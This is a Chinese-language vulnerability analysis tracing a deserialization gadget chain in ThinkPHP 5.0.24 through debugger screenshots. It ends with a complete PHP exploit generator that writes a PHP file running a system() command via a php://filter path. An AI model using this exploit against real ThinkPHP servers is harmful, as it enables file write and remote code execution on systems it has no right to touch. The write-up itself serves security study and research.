前置知识
----

#### POP 链

POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。

#### 魔术方法

```php
__construct()   //创建对象时触发
__destruct()    //对象被销毁时触发
__call()        //在对象上下文中调用不可访问的方法时触发
__callStatic()  //在静态上下文中调用不可访问的方法时触发
__toString()    //把类当作字符串使用时触发
__invoke()      //当脚本尝试将对象调用为函数时触发
__wakeup()      //使用unserialize时触发
__sleep()       //使用serialize时触发
__get()         //用于从不可访问的属性读取数据
__set()         //用于将数据写入不可访问的属性
__isset()       //在不可访问的属性上调用isset()或empty()触发
__unset()       //在不可访问的属性上使用unset()时触发
```

环境准备
----

1. ThinkPHP v5.0.24完整版下载地址：<http://www.thinkphp.cn/donate/download/id/1278.html>
2. PHPStorm
3. PHPStudy + Xdebug

POP 链分析
-------

翻阅资料发现该漏洞暂时没有可远程利用的漏洞入口点，所以本次POP链分析仅基于本地环境模拟一个反序列化的入口点

在`application\index\controller`下的index.php构造一个base64解码的反序列化入口，将exp传入。开始debug

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-5371ce7b0de2c243617a6db922732d691978c31e.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-5371ce7b0de2c243617a6db922732d691978c31e.png)

在调用windows类的时候， 在对象销毁时就会触发`__destruct()`的`removeFiles()`方法，通过可控的`$this->files`利用`file_exists()`可以调用了Model类的`__toString()`方法

```php
$this->files = [new \think\model\Merge]
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-076bab7177be7e6758374915b48ba923a5866610.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-076bab7177be7e6758374915b48ba923a5866610.png)

因为此时exp中的`$filename`此时的值是`\think\model\Merge`的抽象类Model类名，进而触发Model类的`__tostring()`方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d816136e3816bd6162f9c31b9ce0b55d2e90c57e.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d816136e3816bd6162f9c31b9ce0b55d2e90c57e.png)

继续跟进冲冲冲

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6d2dae675371e9eaa0279908dcec7fc2f7e358f2.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6d2dae675371e9eaa0279908dcec7fc2f7e358f2.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7c209a9581fe6225a23ed7e57951274dab15fb56.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7c209a9581fe6225a23ed7e57951274dab15fb56.png)

跟进到`toArray()`方法中， `$this->append`中的值，也就是getError，该方法中`$this->error`可控，设置为 **BelongsTo** 类

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8d34ac58061261bfbedf0cddd123c2602b5d794d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8d34ac58061261bfbedf0cddd123c2602b5d794d.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-cd1b1581dcba91fd6e6cec6156c47ab20199e186.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-cd1b1581dcba91fd6e6cec6156c47ab20199e186.png)

看到`getRelationData()`，它传入的是Relation类型的对象，再判断对象的类名是否相同则返回我们想要的$value值，但是在返回$value值之前，它将去完成EXP中BelongsTo类的`getRelation()`方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c1989ebd7ff4d797c795a1aa96185bfc175a0345.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c1989ebd7ff4d797c795a1aa96185bfc175a0345.png)

接着就会来到BelongsTo类中的`getRelation()`方法，这里的`$this->query`可控，EXP中找了一个没有`removeWhereField()`方法并且存在`__call()`方法的类来作为`$this->query`，这里挑选了**Output**类

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e25aa4ec4667d8bbe603b1c8385e06512d706db5.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e25aa4ec4667d8bbe603b1c8385e06512d706db5.png)

可以看到已经到了Output类的`__call()`方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c7df9162d68d5ef73d827520043b8e28b98b76ee.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c7df9162d68d5ef73d827520043b8e28b98b76ee.png)

这里的`$this->handle`可控 全局搜索可控类中的`set()`方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8636c4e0298a8d0952c5407a379e4e8d8373d237.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8636c4e0298a8d0952c5407a379e4e8d8373d237.png)

这里的`$this->handler`同样可控，所以全局搜索调用`set()`方法的类（记住这个`setTagItem()`方法）

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-275e891a432d169b817e58e47978f223bb8fd058.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-275e891a432d169b817e58e47978f223bb8fd058.png)

这里能够写入文件，但是这里的`$data`无法不可控，所以第一个文件仅传进去以下经过base64且序列化对象的内容

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-cfd30e7da8f3efe5e93283798e61e88c9941abbb.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-cfd30e7da8f3efe5e93283798e61e88c9941abbb.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-007d45e2adc6a04f9de46dedd3d08ab1e73640c8.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-007d45e2adc6a04f9de46dedd3d08ab1e73640c8.png)

上面的函数走完出来之后 又回到**Memcahed**类中的`set()`方法中调用`setTagItem()`，这里又会进行调用`set()`方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8c5613a2d83bc56938f9a57a10850fc03bbd6013.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8c5613a2d83bc56938f9a57a10850fc03bbd6013.png)

重新又来到**File**类的`set()`方法，在这里将要写入`prefix`的值，该值便是exp中base64编码后的payload

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d667159252c2441ff367936cc6e25d43c2148c8f.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d667159252c2441ff367936cc6e25d43c2148c8f.png)

到此为止，我们的payload已经被成功写入

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-4941140a4b52a4013988d1de8122ed62076c58c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-4941140a4b52a4013988d1de8122ed62076c58c1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ec3bdbd2da8601a428ffa5e9ef0328e059197962.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ec3bdbd2da8601a428ffa5e9ef0328e059197962.png)

EXP如下：

```php
<?php
namespace think\process\pipes;
class Windows
{
    private $files = [];
    public function __construct()
    {
        $this->files = [new \think\model\Merge];
    }
}
namespace think\model;
use think\Model;
class Merge extends Model
{
    protected $append = [];
    protected $error;
    public function __construct()
    {
        $this->append = [
            'bb' => 'getError'
        ];
        $this->error = (new \think\model\relation\BelongsTo);
    }
}
namespace think;
class Model{}
namespace think\console;
class Output
{
    protected $styles = [];
    private $handle = null;
    public function __construct()
    {
        $this->styles = ['removeWhereField'];
        $this->handle = (new \think\session\driver\Memcache);
    }
}
namespace think\model\relation;
class BelongsTo
{
    protected $query;
    public function __construct()
    {
        $this->query = (new \think\console\Output);
    }
}
namespace think\session\driver;
class Memcache
{
    protected $handler = null;
    public function __construct()
    {
        $this->handler = (new \think\cache\driver\Memcached);
    }
}
namespace think\cache\driver;
class File
{
    protected $tag;
    protected $options = [];
    public function __construct()
    {
        $this->tag = false;
        $this->options = [
            'expire'        => 3600,
            'cache_subdir'  => false,
            'prefix'        => '',
            'data_compress' => false,
            'path'          => 'php://filter/convert.base64-decode/resource=./',
        ];
    }
}
class Memcached
{
    protected $tag;
    protected $options = [];
    protected $handler = null;
    public function __construct()
    {
        $this->tag = true;
        $this->options = [
            'expire'   => 0,
            'prefix'   => 'PD9waHAKc3lzdGVtKCd0eXBlIEM6XFx3aW5kb3dzXFx3aW4uaW5pJyk7Cj8+',  //经多次尝试，这里的payload在base64编码后不能有=
        ];
        $this->handler = (new File);
    }
}
echo base64_encode(serialize(new \think\process\pipes\Windows));
```